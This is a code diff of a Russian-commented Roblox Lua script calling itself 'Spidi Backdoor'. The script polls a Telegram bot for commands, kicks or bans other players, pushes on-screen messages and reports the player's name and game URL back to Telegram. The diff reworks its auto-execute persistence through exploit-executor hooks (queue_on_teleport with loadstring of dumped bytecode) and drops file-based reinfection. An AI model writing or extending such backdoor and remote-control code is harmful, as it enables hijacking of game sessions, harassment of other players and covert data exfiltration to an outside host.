@@ -45,7 +45,6 @@ local function getChatId()
     return false
 end
 
--- КАСТОМНОЕ УВЕДОМЛЕНИЕ СВЕРХУ
 local function showNotification(title, text, duration)
     duration = duration or 5
     local notif = Instance.new("ScreenGui")
@@ -93,7 +92,6 @@ local function showNotification(title, text, duration)
     textLabel.TextWrapped = true
     textLabel.Parent = frame
     
-    -- Анимация появления
     frame.BackgroundTransparency = 1
     frame.Position = UDim2.new(0.5, -250, 0, -100)
     game:GetService("TweenService"):Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
@@ -123,7 +121,7 @@ local function findPlayer(partialName)
     end
 end
 
-local function handleCommand(cmd, args, authorName)
+local function handleCommand(cmd, args)
     local targetName = args[1]
     local target = nil
     local errorMsg = nil
@@ -137,12 +135,12 @@ local function handleCommand(cmd, args, authorName)
     end
     
     local placeUrl = "https://www.roblox.com/games/"..game.PlaceId
-    local playerInfo = "👤 "..Players.LocalPlayer.Name.." | "..placeUrl
+    local playerInfo = "👤 "..Players.LocalPlayer.Name.."\n🔗 "..placeUrl
     
     if cmd == "kick" then
         if target then
             target:Kick("Kicked by Spidi Backdoor")
-            sendToTelegram("✅ <b>"..authorName.."</b> кикнул <b>"..target.Name.."</b>\n"..playerInfo)
+            sendToTelegram("✅ Кикнут: <b>"..target.Name.."</b>\n"..playerInfo)
             showNotification("Spidi Backdoor", "✅ Кикнут: "..target.Name, 4)
         else
             sendToTelegram("❌ Укажи ник: /kick ник")
@@ -151,7 +149,7 @@ local function handleCommand(cmd, args, authorName)
     elseif cmd == "ban" then
         if target then
             target:Kick("Banned by Spidi Backdoor")
-            sendToTelegram("✅ <b>"..authorName.."</b> забанил <b>"..target.Name.."</b>\n"..playerInfo)
+            sendToTelegram("✅ Забанен: <b>"..target.Name.."</b>\n"..playerInfo)
             showNotification("Spidi Backdoor", "✅ Забанен: "..target.Name, 4)
         else
             sendToTelegram("❌ Укажи ник: /ban ник")
@@ -160,7 +158,7 @@ local function handleCommand(cmd, args, authorName)
     elseif cmd == "message" then
         if target then
             local msg = table.concat(args, " ", 2)
-            showNotification("📩 Сообщение от "..authorName, msg, 6)
+            showNotification("📩 Spidi Backdoor", msg, 6)
             sendToTelegram("✅ Сообщение <b>"..target.Name.."</b>: "..msg.."\n"..playerInfo)
         else
             sendToTelegram("❌ Укажи ник: /message ник текст")
@@ -184,7 +182,7 @@ local function handleCommand(cmd, args, authorName)
         sendToTelegram("👥 <b>Игроков:</b> "..#list.."\n"..table.concat(list, ", "))
         
     elseif cmd == "start" then
-        sendToTelegram("✅ <b>Spidi Backdoor активирован!</b>\n👤 "..Players.LocalPlayer.Name.."\n🔗 "..placeUrl)
+        sendToTelegram("✅ <b>Spidi Backdoor активирован!</b>\n"..playerInfo)
         showNotification("Spidi Backdoor", "✅ Бот подключен! Жду команд.", 3)
         
     elseif cmd == "help" then
@@ -217,7 +215,7 @@ local function getUpdates()
                         for word in string.gmatch(text, "%S+") do table.insert(args, word) end
                         local cmd = args[1]:sub(2):lower()
                         table.remove(args, 1)
-                        handleCommand(cmd, args, msg.from.username or msg.from.first_name)
+                        handleCommand(cmd, args)
                     end
                 end
                 if update.update_id then
@@ -341,21 +339,10 @@ local function createGUI()
     return screenGui
 end
 
--- ==================== СИЛЬНЫЙ АВТО-ЭКСЕКЬЮТ (ПК) ====================
-local function strongAutoExecute()
-    local writefile = (syn and syn.writefile) or writefile or (fluxus and fluxus.writefile)
-    local readfile = (syn and syn.readfile) or readfile or (fluxus and fluxus.readfile)
+-- ==================== АВТО-ЭКСЕКЬЮТ (РАБОТАЕТ ВЕЗДЕ) ====================
+local function autoExecute()
     local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-    
-    if writefile and readfile and queueteleport then
-        local fileName = "SpidiBackdoor.lua"
-        local scriptCode = string.dump(createGUI)  -- Сохраняем GUI
-        if not readfile(fileName) then
-            writefile(fileName, scriptCode)
-        end
-        queueteleport("loadstring(readfile('"..fileName.."'))()")
-        return true
-    elseif queueteleport then
+    if queueteleport then
         queueteleport("loadstring([[" .. string.dump(createGUI) .. "]])()")
         return true
     end
@@ -364,7 +351,7 @@ end
 
 -- ==================== ЗАПУСК ====================
 createGUI()
-strongAutoExecute()
+autoExecute()
 
 task.wait(2)
 getChatId()
